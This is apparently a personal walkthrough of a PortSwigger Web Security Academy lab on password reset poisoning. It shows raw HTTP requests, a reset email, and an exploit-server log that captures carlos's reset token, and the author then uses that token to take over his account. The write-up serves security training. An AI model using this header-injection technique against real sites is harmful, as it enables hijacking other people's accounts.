
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware

*The user `carlos` will carelessly click on any links in emails that he receives*

Questo ci fa capire che dobbiamo generare un'email indirizzata a `carlos`, e l'utente cliccherà automaticamente sul link.

Il fulcro di questo LAB è che la webapp è vulnerabile all'aggiunta di un header arbitrario: ``X-Forwarded-Host`

**E' tramite questo header che verrà costruito il link nel body dell'email inviata all'utente.**

Quindi, tutto ciò che dobbiamo fare è:

- triggerare la generazione di un token per il reset password di `carlos`
- inserire nella richiesta di cui sopra un header che rimandi al NOSTRO webserver malicious
- prendere il token per il reset password di `carlos`
- resettare la password di `carlos` ed accedere col suo user

## happy case

reset password for `wiener`

![](_attachment/Pasted%20image%2020250301125507.png)

![](_attachment/Pasted%20image%2020250301125517.png)

![](_attachment/Pasted%20image%2020250301125530.png)

![](_attachment/Pasted%20image%2020250301125543.png)

![](_attachment/Pasted%20image%2020250301125550.png)

```
Sent:     2025-03-01 11:55:19 +0000
From:     "No reply" <no-reply@0ada008d038e6ea881339dcf00f2002e.web-security-academy.net>
To:       wiener@exploit-0aec001703da6e7e81859c3601680027.exploit-server.net
Subject:  Account recovery

Hello!

Please follow the link below to reset your password.

https://0ada008d038e6ea881339dcf00f2002e.web-security-academy.net/forgot-password?temp-forgot-password-token=aele3bkdp5pl2fmeyufnuldnd0k2c9rt

Thanks,
Support team
```

click on link

https://0ada008d038e6ea881339dcf00f2002e.web-security-academy.net/forgot-password?temp-forgot-password-token=aele3bkdp5pl2fmeyufnuldnd0k2c9rt

![](_attachment/Pasted%20image%2020250301125626.png)

request to change wiener's password to `password`

```
POST /forgot-password?temp-forgot-password-token=aele3bkdp5pl2fmeyufnuldnd0k2c9rt HTTP/2
Host: 0ada008d038e6ea881339dcf00f2002e.web-security-academy.net
Cookie: session=ESOE0TijGj6LXtQIZIg7hFprd4vODGjz
Content-Length: 107
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Origin: https://0ada008d038e6ea881339dcf00f2002e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ada008d038e6ea881339dcf00f2002e.web-security-academy.net/forgot-password?temp-forgot-password-token=aele3bkdp5pl2fmeyufnuldnd0k2c9rt
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

temp-forgot-password-token=aele3bkdp5pl2fmeyufnuldnd0k2c9rt&new-password-1=password&new-password-2=password
```

After, we can actually login with `wiener:password`:

![](_attachment/Pasted%20image%2020250301125737.png)

## forge host header

legit request:

```
POST /forgot-password HTTP/2
Host: 0ada008d038e6ea881339dcf00f2002e.web-security-academy.net
Cookie: session=ESOE0TijGj6LXtQIZIg7hFprd4vODGjz
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Origin: https://0ada008d038e6ea881339dcf00f2002e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ada008d038e6ea881339dcf00f2002e.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=wiener
```

let's change `username` to `carlos` in the body post request, and add our malicious `X-Forwarder-Host` header:

![](_attachment/Pasted%20image%2020250301130011.png)

we got a positive response:

![](_attachment/Pasted%20image%2020250301130026.png)

let's change our access logs:

![](_attachment/Pasted%20image%2020250301130111.png)

we got a token!

```
10.0.3.110      2025-03-01 12:00:14 +0000 "GET /forgot-password?temp-forgot-password-token=g6y1ynxqsnzpavc7skkmhj77396o07sl HTTP/1.1" 404 "user-agent: Chrome/476116"
```

now we can simply go to the legit URL (we can pick it from our previous email) and simply changing the token:

https://0ada008d038e6ea881339dcf00f2002e.web-security-academy.net/forgot-password?temp-forgot-password-token=g6y1ynxqsnzpavc7skkmhj77396o07sl


After, we can set a new password for `carlos` and get access to his profile:



![](_attachment/Pasted%20image%2020250301130858.png)
